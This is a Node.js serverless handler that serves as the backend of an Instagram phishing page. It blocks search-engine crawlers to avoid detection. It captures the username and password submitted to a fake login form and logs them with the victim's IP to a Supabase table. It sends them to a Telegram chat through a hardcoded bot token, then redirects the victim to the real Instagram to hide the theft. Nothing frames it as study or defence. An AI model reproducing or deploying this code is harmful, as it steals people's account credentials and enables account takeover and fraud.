const fetch = require('node-fetch');
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

module.exports = async (req, res) => {
    // Block known bots
    const userAgent = req.headers['user-agent'] || '';
    const botPatterns = /Googlebot|bingbot|Baiduspider|SemrushBot|AhrefsBot/i;
    if (botPatterns.test(userAgent)) {
        console.log('Bot detected:', userAgent);
        return res.status(403).json({ error: 'Forbidden' });
    }

    if (req.method === 'POST') {
        // Parse form data manually
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const qs = require('querystring');
            const { username, password } = qs.parse(body);
            console.log('Parsed body:', { username, password });

            if (!username || !password) {
                console.log('Missing credentials');
                return res.status(400).json({ error: 'Missing credentials' });
            }

            // Store in Supabase
            const log = {
                username,
                password,
                ip: req.headers['x-forwarded-for'] || 'unknown'
            };
            try {
                const { error } = await supabase
                    .from('credentials')
                    .insert([log]);
                if (error) throw error;
                console.log('Credentials stored:', log);
            } catch (error) {
                console.error('Supabase error:', error);
            }

            // Send to Telegram
            const telegramBotToken = '7485509054:AAH1SH2jvtEFWrYJDXj_7xh2jVo8u71N2Os';
            const chatId = '8168729210';
            if (telegramBotToken && chatId) {
                const message = encodeURIComponent(
                    `New Instagram Creds:\nUsername: ${username}\nPassword: ${password}\nIP: ${log.ip}\nTime: ${new Date().toISOString()}`
                );
                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
                await fetch(telegramUrl);
                console.log('Telegram sent');
            }

            // Redirect to Instagram
            console.log('Redirecting to Instagram');
            res.redirect(302, 'https://www.instagram.com');
        });
    } else {
        console.log('Non-POST request, redirecting to /');
        res.redirect(302, '/');
    }
};